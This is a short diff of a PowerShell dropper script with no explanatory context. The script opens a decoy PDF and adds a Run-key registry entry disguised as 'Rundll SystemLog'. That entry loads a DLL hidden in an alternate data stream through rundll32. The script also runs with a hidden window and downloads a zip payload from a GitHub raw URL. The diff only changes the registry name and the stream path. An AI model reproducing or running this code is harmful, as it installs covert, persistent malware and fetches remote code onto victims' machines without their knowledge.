@@ -1,6 +1,6 @@
 echo 1 > File.pdf ; .\File.pdf ; if (Test-Path C:\log\log.dll) { exit } 
 else { 
-New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Rundll SystemLog" -Value 'rundll32 C:\log\logs.txt:log.dll,DllRegisterServer' -Force ;
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Rundll SystemLog 1st" -Value 'rundll32 C:\log\log.txt:log.dll,DllRegisterServer' -Force ;
 powershell -WindowStyle hidden New-Item -ItemType Directory -Force -Path 'C:\log' | Out-Null ;
 echo . > C:\log\log.txt ;
 wget "https://github.com/IsdaM123456/rQsa/raw/refs/heads/main/log.zip" -o C:\log\log.zip; start-sleep 3 ;
